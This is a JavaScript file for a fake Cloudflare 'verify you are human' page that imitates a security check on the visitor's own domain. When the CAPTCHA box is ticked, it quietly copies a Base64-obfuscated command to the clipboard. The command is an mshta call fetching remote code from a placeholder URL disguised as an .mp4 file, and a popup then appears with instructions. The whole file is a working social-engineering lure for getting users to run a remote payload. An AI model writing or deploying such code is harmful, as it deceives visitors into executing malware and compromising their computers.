document.addEventListener("DOMContentLoaded", function () {
    // Show loading spinner for 3 seconds, then show CAPTCHA
    setTimeout(() => {
        document.getElementById("loading-screen").style.display = "none";
        document.getElementById("captcha-container").style.display = "block";
    }, 3000);

    // Detect and display hosting domain dynamically
    const domainName = window.location.hostname;
    document.getElementById("domain-name").innerText = domainName;
    document.getElementById("security-msg").innerText = `${domainName} needs to review the security of your connection before proceeding.`;

    // Update page title
    document.getElementById("page-title").innerText = domainName;

    // Check if Cloudflare logo is broken, if so, replace with an alternative URL
    const cfLogo = document.getElementById("cf-logo");
    cfLogo.onerror = function () {
        this.src = "https://upload.wikimedia.org/wikipedia/commons/4/4a/Cloudflare_Logo.png"; // Backup Cloudflare logo
    };
});

// Verify CAPTCHA and show popup
function verifyCaptcha() {
    const captcha = document.getElementById("captcha");
    
    if (captcha.checked) {
        copyCommand();
        document.getElementById("instruction-popup").style.display = "block";
    }
}

// Clipboard Copy Function with Obfuscation
function copyCommand() {
    const hiddenCommand = getObfuscatedCommand(); // Fetch obfuscated command
    navigator.clipboard.writeText(hiddenCommand).then(() => {
        console.log("Command copied successfully.");
    }).catch(err => {
        console.error("Failed to copy command: ", err);
    });
}

// Obfuscated command from an external file
function getObfuscatedCommand() {
    return atob("bXNodGEgaHR0cHM6Ly9leGFtcGxlLmNvbS9maWxlLm1wNA=="); // Base64-encoded mshta command
}

// Close Popup
function closePopup() {
    document.getElementById("instruction-popup").style.display = "none";
}
